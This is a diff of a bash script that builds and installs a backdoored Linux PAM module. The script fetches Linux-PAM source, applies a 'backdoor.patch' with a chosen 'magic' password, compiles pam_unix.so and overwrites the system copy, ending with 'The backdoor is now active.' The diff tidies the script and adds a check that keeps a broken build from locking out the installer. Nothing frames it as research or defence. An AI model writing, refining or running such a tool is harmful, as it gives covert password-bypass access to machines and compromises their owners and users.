@@ -1,6 +1,4 @@
 #!/bin/bash
-# Log: February 02, 2026, 03:35 PM MDT
-# Note: Always use namespace std if adding C++ components.
 
 PAM_VERSION=""
 PASSWORD=""
@@ -26,55 +24,21 @@ function run_cmd {
 
 function show_help {
     echo "Usage: $0 [-v version] -p password [--restore] [--verbose]"
-    echo ""
     echo "Options:"
     echo "  -v           Specify Linux-PAM version."
     echo "  -p           The 'magic' password for the backdoor."
-    echo "  --restore    Restore original PAM and offer reboot."
+    echo "  --restore    Restore original PAM from backup."
     echo "  --verbose    Show all command output."
-    echo "  -h, --help   Show help message."
 }
 
-function offer_reboot {
-    echo ""
-    while true; do
-        read -p "Task complete. Would you like to reboot now? (y/n): " yn
-        case $yn in
-            [Yy]* ) reboot; break;;
-            [Nn]* ) exit 0;;
-            * ) echo "Please answer y or n.";;
-        esac
-    done
-}
-
-# --- Manual Argument Parsing (Fixes the "illegal option" error) ---
 while [[ $# -gt 0 ]]; do
     case "$1" in
-        -v)
-            PAM_VERSION="$2"
-            shift 2
-            ;;
-        -p)
-            PASSWORD="$2"
-            shift 2
-            ;;
-        --verbose)
-            VERBOSE=true
-            shift
-            ;;
-        --restore)
-            RESTORE=true
-            shift
-            ;;
-        -h|--help)
-            show_help
-            exit 0
-            ;;
-        *)
-            echo "Unknown option: $1"
-            show_help
-            exit 1
-            ;;
+        -v) PAM_VERSION="$2"; shift 2 ;;
+        -p) PASSWORD="$2"; shift 2 ;;
+        --verbose) VERBOSE=true; shift ;;
+        --restore) RESTORE=true; shift ;;
+        -h|--help) show_help; exit 0 ;;
+        *) echo "Unknown option: $1"; exit 1 ;;
     esac
 done
 
@@ -87,7 +51,8 @@ if [ "$RESTORE" = true ]; then
     if [ -f "$BACKUP_PATH" ]; then
         echo "Restoring original module..."
         cp "$BACKUP_PATH" "$PAM_DEST"
-        offer_reboot
+        echo "Restore complete."
+        exit 0
     else
         echo "Error: Backup file $BACKUP_PATH not found."
         exit 1
@@ -98,8 +63,6 @@ if [ -z "$PASSWORD" ]; then
     echo "Error: Password (-p) is required."
     exit 1
 fi
-
-# --- Main Logic ---
 
 echo "Checking dependencies..."
 MISSING_PKGS=()
@@ -123,32 +86,37 @@ PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
 PAM_FILE="v${PAM_VERSION}.tar.gz"
 PAM_DIR="linux-pam-${PAM_VERSION}"
 
-echo "Downloading PAM source..."
-run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}" || { echo "Download failed"; exit 1; }
+echo "Downloading and Patching..."
+run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}"
 run_cmd tar xzf "$PAM_FILE"
 
-echo "Applying patch..."
 if [ -f "backdoor.patch" ]; then
     sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR" &>/dev/null
 else
-    echo "Error: backdoor.patch missing."
-    exit 1
+    echo "Error: backdoor.patch missing."; exit 1
 fi
 
-cd "$PAM_DIR"
-echo "Configuring and compiling..."
+cd "$PAM_DIR" || exit 1
+echo "Compiling (this may take a moment)..."
 if [[ ! -f "./configure" ]]; then run_cmd ./autogen.sh; fi 
 run_cmd ./configure --libdir=/lib/x86_64-linux-gnu --disable-nis --disable-doc
 run_cmd make
 
-if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
-    cp modules/pam_unix/.libs/pam_unix.so ../pam_unix.so
+NEW_MOD="modules/pam_unix/.libs/pam_unix.so"
+
+if [ -f "$NEW_MOD" ]; then
+    if ldd -r "$NEW_MOD" 2>&1 | grep -q "undefined symbol"; then
+        echo "Error: Compiled module has undefined symbols. Installation aborted to prevent lockout."
+        exit 1
+    fi
+
     cd ..
     echo "Build successful. Backing up and installing..."
     [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
-    cp ./pam_unix.so "$PAM_DEST"
-    offer_reboot
+    cp "$PAM_DIR/$NEW_MOD" "$PAM_DEST"
+    chmod 644 "$PAM_DEST"
+    echo "Done. The backdoor is now active."
 else
-    echo "Error: Build failed. Check output above (if --verbose was used)."
+    echo "Error: Build failed."
     exit 1
 fi
